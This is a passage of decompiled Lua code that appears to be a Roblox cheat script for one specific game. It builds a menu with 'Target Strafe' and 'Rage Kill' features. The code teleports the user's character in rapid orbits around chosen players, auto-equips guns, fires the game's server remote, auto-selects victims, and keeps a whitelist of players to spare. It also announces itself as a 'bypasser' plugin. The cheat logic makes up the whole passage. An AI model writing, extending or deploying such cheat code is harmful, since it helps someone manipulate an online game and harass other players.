targetStrafeSpeed = targetStrafeSpeed or 10
targetStrafeDistance = targetStrafeDistance or 6
targetStrafeHeight = targetStrafeHeight or 2
aimPartName = aimPartName or "HumanoidRootPart"
smoothLerpStrength = smoothLerpStrength or 0.15
autoDisableEnabled = autoDisableEnabled or false
adaptivePredictionEnabled = adaptivePredictionEnabled or false
predictionAmount = predictionAmount or 0.5
maxPredictionDistance = maxPredictionDistance or 10
sliderStrafeSpeed = sliderStrafeSpeed or targetStrafeSpeed
sliderStrafeDistance = sliderStrafeDistance or targetStrafeDistance
sliderStrafeHeight = sliderStrafeHeight or targetStrafeHeight
sliderPredictionAmount = sliderPredictionAmount or predictionAmount
baitInterval = baitInterval or 0.01
baitMultiplier = baitMultiplier or 50
spiralAngle = spiralAngle or 0
orbitAngle = orbitAngle or 0
chaosTimer = chaosTimer or 0
jumpPhase = jumpPhase or 0
figure8Time = figure8Time or 0
lastValidTargetPos = lastValidTargetPos or Vector3.new(0, 0, 0)
function isValueKO(p193)
	if p193 then
		return p193:IsA("BoolValue") and p193.Value == true and true or (p193:IsA("NumberValue") and p193.Value > 0 and true or false)
	else
		return false
	end
end
function isPlayerKO(p194)
	if not (p194 and p194.Character) then
		return true
	end
	local v195 = p194.Character
	local v_u_196 = v195:FindFirstChildOfClass("Humanoid")
	if v_u_196 then
		if v_u_196.Health and v_u_196.Health <= 0 then
			return true
		end
		local v197, v198 = pcall(function()
			-- upvalues: (ref) v_u_196
			return v_u_196:GetState()
		end)
		if v197 and v198 == Enum.HumanoidStateType.Dead then
			return true
		end
		local v199, v200, v201 = ipairs({
			"K.O",
			"KO",
			"Knocked",
			"Dead",
			"IsKO",
			"Downed",
			"KnockedOut"
		})
		while true do
			local v202
			v201, v202 = v199(v200, v201)
			if v201 == nil then
				break
			end
			if v_u_196:GetAttribute(v202) == true or v_u_196:GetAttribute(v202) == 1 then
				return true
			end
		end
	end
	local v203, v204, v205 = ipairs({
		"K.O",
		"KO",
		"Knocked",
		"Dead",
		"IsKO",
		"Downed",
		"KnockedOut"
	})
	while true do
		local v206
		v205, v206 = v203(v204, v205)
		if v205 == nil then
			break
		end
		if v195:FindFirstChild(v206) and isValueKO(v195[v206]) then
			return true
		end
		if v195:FindFirstChild("BodyEffects") and (v195.BodyEffects:FindFirstChild(v206) and isValueKO(v195.BodyEffects[v206])) then
			return true
		end
	end
	return false
end
function isValidPos(p207)
	if not p207 then
		return false
	end
	local v208 = p207.Magnitude
	return v208 < 100000 and (0.1 < v208 and (p207.X == p207.X and (p207.Y == p207.Y and p207.Z == p207.Z)))
end
TargetStrafeGroup:AddToggle("EnableTargetStrafe", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("StrafeBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Target Strafe",
	["SyncToggleState"] = false
}):OnChanged(function(p209)
	targetStrafeEnabled = p209
end)
TargetStrafeGroup:AddDropdown("StrafeModeDropdown", {
	["Values"] = { "Static", "Smooth", "Prediction" },
	["Default"] = strafeMode,
	["Text"] = "Strafe Type"
}):OnChanged(function(p210)
	strafeMode = p210
end)
TargetStrafeGroup:AddSlider("SmoothStrength", {
	["Text"] = "Smooth Strength",
	["Default"] = smoothLerpStrength,
	["Min"] = 0.01,
	["Max"] = 1,
	["Rounding"] = 2
}):OnChanged(function(p211)
	smoothLerpStrength = p211
end)
TargetStrafeGroup:AddSlider("PredictionAmount", {
	["Text"] = "Prediction",
	["Default"] = sliderPredictionAmount,
	["Min"] = 0,
	["Max"] = 5,
	["Rounding"] = 2
}):OnChanged(function(p212)
	sliderPredictionAmount = p212
	predictionAmount = p212
end)
TargetStrafeGroup:AddToggle("AdaptivePredictionToggle", {
	["Text"] = "Auto Math Pred",
	["Default"] = adaptivePredictionEnabled
}):OnChanged(function(p213)
	adaptivePredictionEnabled = p213
end)
TargetStrafeGroup:AddToggle("AutoDisable", {
	["Text"] = "Auto Disable on K.O",
	["Default"] = autoDisableEnabled
}):OnChanged(function(p214)
	autoDisableEnabled = p214
end)
TargetStrafeGroup:AddInput("ManualTargetInput", {
	["Text"] = "Manual Target Strafe",
	["Placeholder"] = "Enter player name",
	["Finished"] = true,
	["Callback"] = function(p215)
		-- upvalues: (ref) v_u_6
		if p215 == "" then
			manualTargetPlayer = nil
			return
		end
		local v216 = p215:lower()
		local v217 = v_u_6
		local v218, v219, v220 = ipairs(v217:GetPlayers())
		while true do
			local v221
			v220, v221 = v218(v219, v220)
			if v220 == nil then
				break
			end
			if v221.Character and (v221.Character:FindFirstChild("HumanoidRootPart") and (v221.Name:lower():find(v216) or v221.DisplayName:lower():find(v216))) then
				manualTargetPlayer = v221
				break
			end
		end
	end
})
TargetStrafeGroup:AddDropdown("StrafeModeOptionDropdown", {
	["Values"] = {
		"Custom",
		"Random",
		"Crazy",
		"Bait",
		"Hyper Spiral",
		"Chaos Orbit",
		"Death ZigZag",
		"Fake Jump Pro",
		"Insane Figure8",
		"Nuclear Blender",
		"Demon 360",
		"Void Dancer",
		"Hell Spiral X",
		"Quantum Flicker",
		"Xk5 strafe",
		"Phantom Blitz",
		"Oblivion Vortex",
		"Rift Shatter",
		"Eclipse Pulse",
		"Doom Weaver"
	},
	["Default"] = strafeModeOption,
	["Text"] = "Strafe Mode"
}):OnChanged(function(p222)
	strafeModeOption = p222
end)
TargetStrafeGroup:AddSlider("StrafeSpeed", {
	["Text"] = "Speed",
	["Default"] = targetStrafeSpeed,
	["Min"] = 1,
	["Max"] = 50,
	["Rounding"] = 1
}):OnChanged(function(p223)
	sliderStrafeSpeed = p223
end)
TargetStrafeGroup:AddSlider("StrafeDistance", {
	["Text"] = "Distance",
	["Default"] = targetStrafeDistance,
	["Min"] = 1,
	["Max"] = 50,
	["Rounding"] = 1
}):OnChanged(function(p224)
	sliderStrafeDistance = p224
end)
TargetStrafeGroup:AddSlider("StrafeHeight", {
	["Text"] = "Height",
	["Default"] = targetStrafeHeight,
	["Min"] = -50,
	["Max"] = 50,
	["Rounding"] = 1
}):OnChanged(function(p225)
	sliderStrafeHeight = p225
end)
TargetStrafeGroup:AddSlider("BaitInterval", {
	["Text"] = "Bait Delay",
	["Default"] = baitInterval,
	["Min"] = 0.01,
	["Max"] = 3,
	["Rounding"] = 2
}):OnChanged(function(p226)
	baitInterval = p226
end)
function instantStrafe(p227, p228, p229)
	if strafeMode ~= "Smooth" then
		p227.CFrame = CFrame.new(p228, p228 + p229)
	else
		p227.CFrame = p227.CFrame:Lerp(CFrame.new(p228, p228 + p229), smoothLerpStrength)
		p227.Velocity = p227.Velocity * 0.9
		p227.RotVelocity = p227.RotVelocity * 0.9
	end
end
function performStrafe(p230)
	-- upvalues: (ref) v_u_8
	if p230 and p230.Character and p230.Character:FindFirstChild(aimPartName) then
		local v231 = p230.Character[aimPartName]
		local v232 = v_u_8.Character
		if v232 then
			v232 = v_u_8.Character:FindFirstChild("HumanoidRootPart")
		end
		if v232 then
			if autoDisableEnabled and isPlayerKO(p230) then
				targetStrafeEnabled = false
			else
				local v233 = v231.Position
				if isValidPos(v233) then
					lastValidTargetPos = v233
				else
					v233 = lastValidTargetPos
				end
				local v234
				if strafeMode ~= "Prediction" or not adaptivePredictionEnabled then
					v234 = v233
				else
					local v235 = Vector3.new(v231.Velocity.X, 0, v231.Velocity.Z)
					v234 = v233 + v235.Unit * math.min(v235.Magnitude * predictionAmount, maxPredictionDistance)
					if isValidPos(v234) then
						if v235.Magnitude <= 0 then
							v234 = v233
						end
					else
						v234 = v233
					end
				end
				local v236 = tick()
				local v237 = Vector3.new()
				if strafeModeOption ~= "Custom" then
					if strafeModeOption ~= "Random" then
						if strafeModeOption ~= "Crazy" then
							if strafeModeOption ~= "Bait" then
								if strafeModeOption ~= "Hyper Spiral" then
									if strafeModeOption ~= "Chaos Orbit" then
										if strafeModeOption ~= "Death ZigZag" then
											if strafeModeOption ~= "Fake Jump Pro" then
												if strafeModeOption ~= "Insane Figure8" then
													if strafeModeOption ~= "Nuclear Blender" then
														if strafeModeOption ~= "Demon 360" then
															if strafeModeOption ~= "Void Dancer" then
																if strafeModeOption ~= "Hell Spiral X" then
																	if strafeModeOption ~= "Quantum Flicker" then
																		if strafeModeOption ~= "xk5 strafe" then
																			if strafeModeOption ~= "Phantom Blitz" then
																				if strafeModeOption ~= "Oblivion Vortex" then
																					if strafeModeOption ~= "Rift Shatter" then
																						if strafeModeOption ~= "Eclipse Pulse" then
																							if strafeModeOption == "Doom Weaver" then
																								figure8Time = figure8Time + 0.2
																								targetStrafeSpeed = 1900 + math.random(700, 2100)
																								local v238 = math.random(30, 70)
																								local v239 = figure8Time * 20
																								targetStrafeHeight = math.sin(v239 * 3) * 140 + math.cos(v239 * 5) * 50
																								v237 = Vector3.new(math.sin(v239 * 2) * v238 * 2, targetStrafeHeight, math.cos(v239 * 2) * v238)
																							end
																						else
																							local v240 = v236 * 90
																							targetStrafeSpeed = 2200
																							targetStrafeDistance = 30 + math.cos(v240 * 2) * 40
																							targetStrafeHeight = math.sin(v240 * 6) * 150 - 50
																							v237 = Vector3.new(math.sin(v240 * 15) * targetStrafeDistance, targetStrafeHeight, math.cos(v240 * 15) * targetStrafeDistance)
																						end
																					else
																						chaosTimer = chaosTimer + 0.3
																						targetStrafeSpeed = 2000 + math.random(1000, 2500)
																						targetStrafeDistance = math.random(15, 60)
																						targetStrafeHeight = math.sin(chaosTimer * 50) * 120 - 30
																						v237 = Vector3.new(math.sin(v236 * 80) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * 80) * targetStrafeDistance)
																					end
																				else
																					orbitAngle = orbitAngle + 3
																					targetStrafeSpeed = 1600 + math.random(800, 2000)
																					targetStrafeDistance = 25 + orbitAngle % 60
																					targetStrafeHeight = math.sin(v236 * 70) * 100
																					v237 = Vector3.new(math.sin(orbitAngle * 10) * targetStrafeDistance, targetStrafeHeight, math.cos(orbitAngle * 10) * targetStrafeDistance)
																				end
																			else
																				spiralAngle = spiralAngle + 4
																				targetStrafeSpeed = 1800 + math.random(600, 1400)
																				targetStrafeDistance = 20 + math.sin(v236 * 60) * 30
																				targetStrafeHeight = math.cos(spiralAngle * 5) * 90 - 20
																				v237 = Vector3.new(math.sin(spiralAngle * 12) * targetStrafeDistance, targetStrafeHeight, math.cos(spiralAngle * 12) * targetStrafeDistance)
																			end
																		elseif v236 % 4 > 1 then
																			targetStrafeSpeed = 1300 + math.sin(v236 * 35) * 1000
																			targetStrafeDistance = 40 + math.sin(v236 * 45) * 30
																			targetStrafeHeight = math.sin(v236 * 50) * 85
																			v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
																		else
																			targetStrafeSpeed = 1100 + math.random(800, 1600)
																			targetStrafeDistance = math.random(1, 4)
																			targetStrafeHeight = -3.3
																			v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
																		end
																	else
																		local v241 = v236 * 100
																		targetStrafeSpeed = 2000
																		targetStrafeDistance = math.random(10, 70)
																		targetStrafeHeight = math.random(-40, 80)
																		v237 = Vector3.new(math.sin(v241) * targetStrafeDistance, targetStrafeHeight, math.cos(v241) * targetStrafeDistance)
																	end
																else
																	spiralAngle = spiralAngle + 3.5
																	targetStrafeSpeed = 1500
																	targetStrafeDistance = 15 + spiralAngle % 50
																	targetStrafeHeight = spiralAngle % 100 - 50
																	v237 = Vector3.new(math.sin(spiralAngle * 10) * targetStrafeDistance, targetStrafeHeight, math.cos(spiralAngle * 10) * targetStrafeDistance)
																end
															else
																local v242 = v236 * 35
																targetStrafeSpeed = 1200
																targetStrafeDistance = 40 + math.sin(v242 * 3) * 25
																targetStrafeHeight = math.sin(v242 * 8) * 100 - 30
																v237 = Vector3.new(math.sin(v242) * targetStrafeDistance * 1.5, targetStrafeHeight, math.cos(v242) * targetStrafeDistance * 1.5)
															end
														else
															orbitAngle = orbitAngle + 2.5
															targetStrafeDistance = 30 + math.sin(v236 * 50) * 20
															targetStrafeHeight = math.abs(math.sin(v236 * 45)) * 80
															v237 = Vector3.new(math.sin(orbitAngle * 7) * targetStrafeDistance, targetStrafeHeight, math.cos(orbitAngle * 7) * targetStrafeDistance)
														end
													else
														spiralAngle = spiralAngle + 1.8
														targetStrafeSpeed = 800 + math.random(400, 1200)
														targetStrafeDistance = math.random(20, 65)
														targetStrafeHeight = math.sin(v236 * 40) * 60 + math.cos(spiralAngle * 3) * 30
														v237 = Vector3.new(math.sin(spiralAngle * 5) * targetStrafeDistance, targetStrafeHeight, math.cos(spiralAngle * 5) * targetStrafeDistance)
													end
												else
													figure8Time = figure8Time + 0.12
													targetStrafeSpeed = 350 + math.random(300, 900)
													local v243 = math.random(25, 50)
													local v244 = figure8Time * 14
													v237 = Vector3.new(math.sin(v244) * v243 * 1.8, math.sin(v244 * 2) * 50, math.cos(v244) * v243)
												end
											else
												jumpPhase = (jumpPhase + 0.25) % 1
												targetStrafeSpeed = 300 + math.random(250, 850)
												targetStrafeDistance = math.random(15, 48)
												targetStrafeHeight = jumpPhase < 0.1 and 25 + jumpPhase * 400 or math.random(5, 18)
												v237 = Vector3.new(math.sin(v236 * 35) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * 35) * targetStrafeDistance)
											end
										else
											chaosTimer = chaosTimer + 0.18
											targetStrafeSpeed = 400 + math.random(300, 900)
											local v245 = math.sin(chaosTimer * 45) * 55
											targetStrafeDistance = math.random(15, 45)
											targetStrafeHeight = math.random(10, 50)
											v237 = Vector3.new(v245, targetStrafeHeight, math.random(-30, 30))
										end
									else
										orbitAngle = orbitAngle + 0.65
										targetStrafeSpeed = 300 + math.random(300, 900)
										targetStrafeDistance = math.random(20, 50)
										targetStrafeHeight = math.sin(v236 * 20) * 45
										v237 = Vector3.new(math.sin(orbitAngle) * targetStrafeDistance, targetStrafeHeight, math.cos(orbitAngle) * targetStrafeDistance)
									end
								else
									spiralAngle = spiralAngle + 0.8
									targetStrafeSpeed = 250 + math.random(200, 800)
									targetStrafeDistance = math.random(15, 50)
									targetStrafeHeight = 10 + spiralAngle * 0.9 % 45
									v237 = Vector3.new(math.sin(spiralAngle) * targetStrafeDistance, targetStrafeHeight, math.cos(spiralAngle) * targetStrafeDistance)
								end
							else
								if baitNextToggle <= v236 then
									baitIsStrong = not baitIsStrong
									baitNextToggle = v236 + baitInterval
								end
								if baitIsStrong then
									targetStrafeSpeed = math.random(200, 600) * baitMultiplier
									targetStrafeDistance = math.random(10, 50) * baitMultiplier
									targetStrafeHeight = math.random(10, 40) * baitMultiplier
								else
									targetStrafeSpeed = math.random(10, 40)
									targetStrafeDistance = math.random(5, 20)
									targetStrafeHeight = sliderStrafeHeight
								end
								v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
							end
						else
							targetStrafeSpeed = math.random(100, 500)
							targetStrafeDistance = math.random(10, 50)
							targetStrafeHeight = math.random(5, 40)
							v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
						end
					else
						targetStrafeSpeed = math.random(5, 25)
						targetStrafeDistance = math.random(5, 30)
						targetStrafeHeight = sliderStrafeHeight
						v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
					end
				else
					targetStrafeSpeed = sliderStrafeSpeed
					targetStrafeDistance = sliderStrafeDistance
					targetStrafeHeight = sliderStrafeHeight
					v237 = Vector3.new(math.sin(v236 * targetStrafeSpeed) * targetStrafeDistance, targetStrafeHeight, math.cos(v236 * targetStrafeSpeed) * targetStrafeDistance)
				end
				local v246 = v234 + v237
				if not isValidPos(v246) then
					v246 = v232.Position + v232.CFrame.LookVector * targetStrafeDistance
				end
				local v247 = v234 - v232.Position
				local v248
				if v247.Magnitude <= 1 then
					v248 = Vector3.new(v232.CFrame.LookVector.X, 0, v232.CFrame.LookVector.Z)
				else
					local v249 = v247.Unit
					v248 = Vector3.new(v249.X, 0, v249.Z)
					if v248.Magnitude == 0 then
						v248 = v232.CFrame.LookVector
					end
				end
				instantStrafe(v232, v246, v248)
			end
		else
			return
		end
	else
		return
	end
end
v_u_5.RenderStepped:Connect(function()
	if autoDisableEnabled and not targetStrafeEnabled then
		local v250 = aiming and targetPlayer or manualTargetPlayer
		if v250 and (v250.Character and not isPlayerKO(v250)) then
			targetStrafeEnabled = true
		end
	end
	if targetStrafeEnabled then
		if aiming and targetPlayer then
			performStrafe(targetPlayer)
		end
		if manualTargetPlayer then
			performStrafe(manualTargetPlayer)
		end
	end
end)
SUPPORTED_GAME = 2788229376
isSupportedGame = game.PlaceId == SUPPORTED_GAME
if not isSupportedGame then
	warn("Loaded bypasser Valkyrie plugin ANTIGAGX V.1.2")
end
player = v_u_6.LocalPlayer
character = player.Character or player.CharacterAdded:Wait()
local v251 = isSupportedGame
if v251 then
	v251 = v_u_11:FindFirstChild("MainEvent")
end
mainEvent = v251
allowedTools = {
	["[AUG]"] = true,
	["[Rifle]"] = true,
	["[LMG]"] = true,
	["[Flintlock]"] = true
}
RageGroup = v20:AddRightGroupbox("Rage Kill")
isActive = false
manualTargetActive = false
targetPlayer = nil
targetHRP = nil
equippedTools = {}
whitelist = {}
whitelistConnections = {}
lastReloadTimes = {}
ReloadCooldown = 0.7
OrbitCooldown = 0.8
rageBindActive = false
AutoWeapons = {}
local v_u_252 = false
RageGroup:AddToggle("RageKillToggle", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("RageKillKey", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Rage Kill",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p253)
		-- upvalues: (ref) v_u_9
		if not v_u_9:GetFocusedTextBox() then
			rageBindActive = p253
			if isActive and rageBindActive then
				equipAndTrackTools()
			end
		end
	end
}):OnChanged(function(p254)
	isActive = p254
	rageBindActive = p254
	if isActive then
		equipAndTrackTools()
	end
end)
RageGroup:AddSlider("OrbitFrametime", {
	["Text"] = "Strafe Frametime",
	["Default"] = 0.8,
	["Min"] = 0.3,
	["Max"] = 1.2,
	["Rounding"] = 1,
	["Callback"] = function(p255)
		OrbitCooldown = p255
	end
})
RageGroup:AddDropdown("NearShootDropdown", {
	["Text"] = "Near Shoot",
	["Values"] = { "true", "false" },
	["Default"] = "false",
	["Multi"] = false
}):OnChanged(function(p256)
	-- upvalues: (ref) v_u_252
	v_u_252 = p256 == "true"
end)
local v_u_257 = RageGroup:AddLabel("Selected: None")
RageGroup:AddDropdown("AutoWeaponSelect", {
	["Values"] = {
		"[AUG]",
		"[Rifle]",
		"[LMG]",
		"[Flintlock]"
	},
	["Default"] = "",
	["Multi"] = false,
	["Text"] = "Weapons",
	["Callback"] = function(p258)
		-- upvalues: (ref) v_u_257
		if AutoWeapons[p258] then
			AutoWeapons[p258] = nil
		else
			AutoWeapons[p258] = true
		end
		local v259, v260, v261 = pairs(AutoWeapons)
		local v262 = {}
		while true do
			local v263
			v261, v263 = v259(v260, v261)
			if v261 == nil then
				break
			end
			table.insert(v262, v261)
		end
		if #v262 ~= 0 then
			v_u_257:SetText("Selected: " .. table.concat(v262, ", "))
		else
			v_u_257:SetText("Selected: None")
		end
	end
})
function shouldEquip(p264)
	return AutoWeapons[p264] == true
end
function equipAndTrackTools()
	table.clear(equippedTools)
	local v265 = player:FindFirstChild("Backpack")
	if v265 then
		local v266, v267, v268 = ipairs(v265:GetChildren())
		while true do
			local v269
			v268, v269 = v266(v267, v268)
			if v268 == nil then
				break
			end
			if v269:IsA("Tool") and (allowedTools[v269.Name] and shouldEquip(v269.Name)) then
				v269.Parent = character
			end
		end
	end
	local v270, v271, v272 = ipairs(character:GetChildren())
	while true do
		local v273
		v272, v273 = v270(v271, v272)
		if v272 == nil then
			break
		end
		if v273:IsA("Tool") and (allowedTools[v273.Name] and (shouldEquip(v273.Name) and v273:FindFirstChild("Handle"))) then
			table.insert(equippedTools, v273)
		end
	end
end
function handleAutoReload(p_u_274)
	pcall(function()
		-- upvalues: (ref) p_u_274
		mainEvent:FireServer("Reload", p_u_274)
	end)
	lastReloadTimes[p_u_274] = tick()
end
RageGroup:AddInput("OrbitTarget", {
	["Default"] = "",
	["Placeholder"] = "Enter player name",
	["Numeric"] = false,
	["Finished"] = true,
	["Text"] = "Manual Target Rage",
	["Callback"] = function(p275)
		-- upvalues: (ref) v_u_6, (ref) v_u_5
		if not isActive then
			return
		end
		targetPlayer = nil
		local v276 = p275:lower()
		local v277 = v_u_6
		local v278, v279, v280 = ipairs(v277:GetPlayers())
		while true do
			local v281
			v280, v281 = v278(v279, v280)
			if v280 == nil then
				break
			end
			if v281.Name:lower():find(v276) or v281.DisplayName:lower():find(v276) then
				targetPlayer = v281
				break
			end
		end
		if targetPlayer and targetPlayer.Character then
			targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
			local v_u_282 = character:FindFirstChild("HumanoidRootPart")
			if targetHRP and v_u_282 then
				manualTargetActive = true
				equipAndTrackTools()
				local v_u_283 = v_u_282.CFrame
				local v_u_284 = OrbitCooldown
				local v_u_285 = tick()
				local v_u_286 = 5
				local v_u_287 = Random.new()
				local v_u_288 = nil
				v_u_288 = v_u_5.Heartbeat:Connect(function()
					-- upvalues: (ref) v_u_285, (ref) v_u_284, (ref) v_u_282, (ref) v_u_283, (ref) v_u_288, (ref) v_u_287, (ref) v_u_286
					local v289 = tick() - v_u_285
					if v_u_284 > v289 then
						local v290 = v289 * v_u_287:NextNumber(100, 5000)
						local v291 = Vector3.new(math.cos(v290) * v_u_286, 0, math.sin(v290) * v_u_286)
						v_u_282.CFrame = CFrame.new(targetHRP.Position + v291)
					else
						v_u_282.CFrame = v_u_283
						v_u_288:Disconnect()
						manualTargetActive = false
					end
				end)
			end
		else
			return
		end
	end
})
selectedPlayer = nil
function applyWhitelistVisuals(p292)
	local function v_u_299(p293)
		if p293 and not p293:FindFirstChild("WhitelistedCham") then
			p293:FindFirstChild("HumanoidRootPart")
			local v294 = p293:FindFirstChild("Head") or p293:WaitForChild("Head", 2)
			if v294 then
				local v295 = Instance.new("Highlight")
				v295.Name = "WhitelistedCham"
				v295.Adornee = p293
				v295.FillColor = Color3.fromRGB(128, 0, 128)
				v295.FillTransparency = 0.5
				v295.OutlineColor = Color3.fromRGB(0, 0, 0)
				v295.OutlineTransparency = 0
				v295.Parent = p293
				local v296 = Instance.new("BillboardGui")
				v296.Name = "WhitelistedTag"
				v296.Size = UDim2.new(0, 120, 0, 16)
				v296.Adornee = v294
				v296.AlwaysOnTop = true
				local v297 = Instance.new("TextLabel")
				v297.Size = UDim2.new(1, 0, 1, 0)
				v297.BackgroundTransparency = 1
				v297.Text = "Rage WhiteList"
				v297.Font = Enum.Font.SourceSansBold
				v297.TextScaled = true
				v297.TextStrokeTransparency = 0
				v297.TextColor3 = Color3.fromRGB(255, 0, 255)
				v297.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
				local v298 = Instance.new("UIGradient")
				v298.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 255)) })
				v298.Parent = v297
				v297.Parent = v296
				v296.Parent = p293
			end
		else
			return
		end
	end
	if p292.Character then
		v_u_299(p292.Character)
	end
	if whitelistConnections[p292] then
		whitelistConnections[p292]:Disconnect()
	end
	whitelistConnections[p292] = p292.CharacterAdded:Connect(function(p300)
		-- upvalues: (ref) v_u_299
		task.wait(0.5)
		v_u_299(p300)
	end)
end
function removeWhitelistVisuals(p301)
	if whitelistConnections[p301] then
		whitelistConnections[p301]:Disconnect()
		whitelistConnections[p301] = nil
	end
	local v302 = p301.Character
	if v302 then
		local v303 = v302:FindFirstChild("WhitelistedCham")
		if v303 then
			v303:Destroy()
		end
		local v304 = v302:FindFirstChild("WhitelistedTag")
		if v304 then
			v304:Destroy()
		end
	end
end
function findPlayer(p305)
	-- upvalues: (ref) v_u_6
	local v306 = string.lower(p305)
	local v307 = v_u_6
	local v308, v309, v310 = ipairs(v307:GetPlayers())
	local v311 = {}
	while true do
		local v312
		v310, v312 = v308(v309, v310)
		if v310 == nil then
			break
		end
		local v313 = string.lower(v312.Name)
		local v314 = string.lower(v312.DisplayName)
		if v313 == v306 or v314 == v306 then
			return v312
		end
		if string.find(v313, v306) or string.find(v314, v306) then
			table.insert(v311, v312)
		end
	end
	if #v311 == 1 then
		return v311[1]
	end
	if #v311 <= 1 then
		return nil
	end
	table.sort(v311, function(p315, p316)
		return #p315.Name < #p316.Name
	end)
	return v311[1]
end
function getPlayerNames(p317)
	-- upvalues: (ref) v_u_6
	local v318 = v_u_6
	local v319, v320, v321 = ipairs(v318:GetPlayers())
	local v322 = {}
	while true do
		local v323
		v321, v323 = v319(v320, v321)
		if v321 == nil then
			break
		end
		if not p317 or (string.find(string.lower(v323.Name), string.lower(p317)) or string.find(string.lower(v323.DisplayName), string.lower(p317))) then
			table.insert(v322, v323.Name)
		end
	end
	return v322
end
playerDropdown = RageGroup:AddDropdown("PlayerDropdown", {
	["Text"] = "Select Player",
	["Values"] = getPlayerNames(),
	["Default"] = getPlayerNames()[1] or "None",
	["Multi"] = false,
	["Callback"] = function(p324)
		selectedPlayer = p324
	end
})
playerInput = RageGroup:AddInput("PlayerInput", {
	["Text"] = "Search Player",
	["Default"] = "",
	["Placeholder"] = "Enter player name...",
	["Numeric"] = false,
	["Finished"] = true,
	["Callback"] = function(p325)
		local v326 = getPlayerNames(p325)
		local v327 = #v326 == 0 and { "None" } or v326
		if playerDropdown.SetValues then
			playerDropdown:SetValues(v327)
		end
		local v328 = p325:lower()
		local v329, v330, v331 = ipairs(v327)
		local v332 = false
		while true do
			local v333
			v331, v333 = v329(v330, v331)
			if v331 == nil then
				break
			end
			if v333:lower() == v328 then
				if playerDropdown.SetValue then
					playerDropdown:SetValue(v333)
					selectedPlayer = v333
					v332 = true
				else
					v332 = true
				end
				break
			end
		end
		if not v332 and playerDropdown.SetValue then
			playerDropdown:SetValue(v327[1])
			selectedPlayer = v327[1] ~= "None" and v327[1] or nil
		end
	end
})
RageGroup:AddButton("Whitelist", function()
	if selectedPlayer then
		local v334 = findPlayer(selectedPlayer)
		if v334 then
			whitelist[v334] = true
			applyWhitelistVisuals(v334)
		end
	end
end)
RageGroup:AddButton("Clear Whitelist", function()
	local v335, v336, v337 = pairs(whitelist)
	while true do
		local v338
		v337, v338 = v335(v336, v337)
		if v337 == nil then
			break
		end
		removeWhitelistVisuals(v337)
	end
	whitelist = {}
end)
v_u_6.PlayerAdded:Connect(function()
	local v339 = playerInput:GetValue()
	playerInput.Callback(v339)
end)
v_u_6.PlayerRemoving:Connect(function()
	local v340 = playerInput:GetValue()
	playerInput.Callback(v340)
end)
player.CharacterAdded:Connect(function(p341)
	character = p341
	p341.ChildAdded:Connect(function(p342)
		if p342:IsA("Tool") and (allowedTools[p342.Name] and (shouldEquip(p342.Name) and p342:FindFirstChild("Handle"))) then
			table.insert(equippedTools, p342)
		end
	end)
	p341.ChildRemoved:Connect(function(p343)
		if p343:IsA("Tool") then
			local v344, v345, v346 = ipairs(equippedTools)
			while true do
				local v347
				v346, v347 = v344(v345, v346)
				if v346 == nil then
					break
				end
				if v347 == p343 then
					table.remove(equippedTools, v346)
					break
				end
			end
		end
	end)
	local v348, v349, v350 = pairs(whitelist)
	while true do
		local v351
		v350, v351 = v348(v349, v350)
		if v350 == nil then
			break
		end
		applyWhitelistVisuals(v350)
	end
end)
function isKO(p352)
	if not p352 then
		return true
	end
	local v353 = p352:FindFirstChild("BodyEffects")
	if not v353 then
		return true
	end
	local v354 = v353:FindFirstChild("K.O")
	return not v354 and true or v354.Value
end
v_u_5.Heartbeat:Connect(function()
	-- upvalues: (ref) v_u_6, (ref) v_u_252
	if not isActive then
		return
	end
	if not (rageBindActive or manualTargetActive) then
		return
	end
	equipAndTrackTools()
	local v355 = character:FindFirstChild("HumanoidRootPart")
	if not v355 then
		return
	end
	local v356 = nil
	local v357 = math.huge
	local v_u_358
	if manualTargetActive and (targetPlayer and targetPlayer.Character) then
		if isKO(targetPlayer.Character) then
			v_u_358 = v356
		else
			v_u_358 = targetPlayer.Character:FindFirstChild("Head")
			local _ = (targetPlayer.Character.HumanoidRootPart.Position - v355.Position).Magnitude
		end
	else
		local v359 = v_u_6
		local v360, v361, v362 = ipairs(v359:GetPlayers())
		while true do
			local v363
			v362, v363 = v360(v361, v362)
			if v362 == nil then
				v_u_358 = v356
				break
			end
			if v363 ~= player and (v363.Character and not whitelist[v363]) then
				v_u_358 = v363.Character:FindFirstChild("Head")
				local v364 = v363.Character:FindFirstChild("HumanoidRootPart")
				if v_u_358 and (v364 and not isKO(v363.Character)) and (not v363.Character:FindFirstChild("GRABBING_CONSTRAINT") and (not v363.Character:FindFirstChildOfClass("ForceField") and v363.Character:FindFirstChild("FULLY_LOADED_CHAR"))) then
					local v365 = (v364.Position - v355.Position).Magnitude
					if v_u_252 and v365 < v357 then
						v356 = v_u_358
						v357 = v365
					elseif not v_u_252 then
						break
					end
				end
			end
		end
	end
	if v_u_358 then
		local v366, v367, v368 = ipairs(equippedTools)
		local v369 = 0
		while true do
			local v370
			v368, v370 = v366(v367, v368)
			if v368 == nil then
				break
			end
			if v370.Parent == character and v370:FindFirstChild("Handle") then
				v369 = v369 + 1
			end
		end
